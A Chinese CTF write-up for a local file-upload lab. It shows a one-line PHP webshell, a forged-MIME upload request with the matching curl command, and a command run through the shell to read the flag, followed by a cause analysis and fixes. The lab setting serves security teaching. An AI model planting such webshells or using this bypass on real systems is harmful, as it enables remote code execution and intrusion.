# CTF 解题步骤报告 —— 校园二手交易平台文件上传靶场

> 靶场主题：文件上传"基本类型防护"绕过（MIME 伪造 + 扩展名黑名单缺陷）
> 难度：入门 ★☆☆☆☆　　漏洞类型：任意文件上传 → 远程代码执行（RCE）→ 读取敏感文件

---

## 1. 目标地址与环境信息

| 项目 | 内容 |
|------|------|
| 靶场地址 | `http://<靶机IP>:26112`（本机为 `http://127.0.0.1:26112`） |
| 默认账号 | `admin` |
| 默认密码 | `123456` |
| 技术栈 | PHP 8.2 + Apache（`php:8.2-apache` 容器） |
| flag 位置 | 容器根目录 `/flag`（Web 根目录之外） |
| flag 格式 | `flag{...}`（以提交校验页面返回"正确"为准） |

## 2. 环境启动

在项目根目录执行：

```bash
docker compose up -d          # 构建并后台启动
docker compose ps             # 确认容器 Up、端口 0.0.0.0:26112->80/tcp
```

浏览器或 curl 访问 `http://127.0.0.1:26112`，出现"青苗校园二手交易平台"首页即启动成功。

## 3. 正常登录

1. 打开 `http://127.0.0.1:26112/login.php`，用户名输入框已默认预填 `admin`；
2. 输入弱口令 `123456`，点击"登 录"；
3. 登录成功后 302 跳转至个人中心 `dashboard.php`（头像上传入口即漏洞入口）。

> 登录功能本身逻辑正常：错误密码会提示"用户名或密码错误"；未登录直接访问 `/dashboard.php` 会被 302 重定向回登录页。

## 4. 发现漏洞 Hint

查看主页（`http://127.0.0.1:26112/`）**页面源代码**，在 HTML 中发现开发遗留注释：

```html
<!-- TODO(dev): avatar upload legacy validation only blocks exe/bat/sh/cmd;
     php/png/jpg are not filtered and original filename is kept under /uploads/. -->
```

该 hint 明确给出三个关键信息：

1. 上传校验是"遗留规则"，黑名单只拦 `exe / bat / sh / cmd`；
2. `php / png / jpg` 均不过滤；
3. 文件以**原文件名**保存在 `/uploads/` 目录下。

## 5. 制作一句话木马

本地新建 `shell.php`，内容如下（一句话木马，通过 GET 参数 `cmd` 执行系统命令）：

```php
<?php @system($_GET['cmd']);
```

## 6. 上传绕过过程

个人中心"上传头像"表单的前端限制仅为 `accept="image/*"`（纯前端提示，可直接绕过）。使用 Burp Suite 抓包或 curl 直接构造请求：

**关键点一：伪造 Content-Type（绕过 MIME 校验）**

后端仅检查 `$_FILES['avatar']['type']` 是否以 `image/` 开头，而该值由客户端请求体提供，完全可控。将上传报文中该字段改为 `image/png`：

```http
POST /upload.php HTTP/1.1
Host: 127.0.0.1:26112
Cookie: PHPSESSID=<登录会话>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/png

<?php @system($_GET['cmd']);
------WebKitFormBoundary--
```

**关键点二：扩展名黑名单缺陷**

后端黑名单仅含 `exe / bat / sh / cmd` 四个扩展名，`php` 不在名单内 —— `filename="shell.php"` 直接通过校验。

**关键点三：无内容检测、无重命名**

后端不检查文件内容（无 `getimagesize`、无幻术检测），也不重命名文件，`shell.php` 以原名写入 `/var/www/html/uploads/shell.php`。

curl 等价命令：

```bash
curl -b cookies.txt -F "avatar=@shell.php;type=image/png" http://127.0.0.1:26112/upload.php
# 返回：上传成功：头像已保存为 /uploads/shell.php
```

对照实验：将 `avatar.exe`（即使伪造 `Content-Type: image/png`）上传会被黑名单拦截，提示"禁止上传可执行脚本文件（exe / bat / sh / cmd）"，`/uploads/` 下不会出现该文件。

## 7. 获取 Flag

`uploads/` 目录保留 PHP 执行能力（未部署任何禁执行的 `.htaccess`），直接访问木马执行命令读取容器根目录下的 flag：

```
http://127.0.0.1:26112/uploads/shell.php?cmd=cat%20/flag
```

返回：

```
flag{this_is_zhangchangxin's_bigwork}
```

## 8. 提交 Flag 验证

进入"提交 Flag"页面（`/flag_submit.php`），输入获得的 flag 并提交：

- 正确 flag → 提示"✔ Flag 正确，恭喜你完成挑战！"；
- 错误 flag → 提示"✘ Flag 不正确，请再试一次"。

后端逻辑：读取容器 `/flag` 文件内容，使用 `hash_equals()` 与输入进行恒时比较；全程不回显真实 flag，页面源码中也无 flag（防抄袭、防侧信道）。

## 9. 漏洞成因分析

| 环节 | 缺陷 | 后果 |
|------|------|------|
| MIME 校验 | 信任客户端可控的 `Content-Type` | 伪造 `image/png` 即可绕过 |
| 扩展名校验 | 黑名单覆盖面不足（漏掉 `php`/`phtml` 等） | `.php` 文件直接放行 |
| 文件内容 | 未做任何内容级检测 | 图片马/脚本马均可上传 |
| 文件存储 | 保留原文件名 + 保存目录可执行 PHP | 上传即 getshell |
| 权限配置 | `uploads/` 未禁止脚本执行 | 上传的 `.php` 被解析执行 |
| 信息泄露 | 主页遗留内部 TODO 注释 | 攻击面直接暴露 |

## 10. 修复建议

1. **白名单校验扩展名**：仅允许 `jpg/jpeg/png/gif/webp`，拒绝一切其他扩展名（黑名单模式天然不全）；
2. **服务端真实类型检测**：使用 `finfo_file()` / `getimagesize()` 校验文件真实魔数，而非信任 HTTP 报文；
3. **重命名文件**：保存时使用随机文件名（如 `bin2hex(random_bytes(8)) . '.png'`），丢弃用户提供的文件名，同时剥离路径信息；
4. **禁止上传目录执行脚本**：`uploads/` 目录配置 `php_admin_flag engine off`（Apache）或 `location ~* ^/uploads/.*\.(php|phtml)$ { deny all; }`（Nginx）；
5. **隔离存储**：上传文件存至 Web 根目录之外，或使用对象存储/静态域名单独承载；
6. **限制权限**：上传目录只写不执行，文件权限最小化；
7. **清理敏感注释**：上线前移除源码中的内部 TODO/hint 注释，避免泄露实现细节；
8. **纵深防御**：限制上传频率与大小、记录审计日志、对异常文件告警。
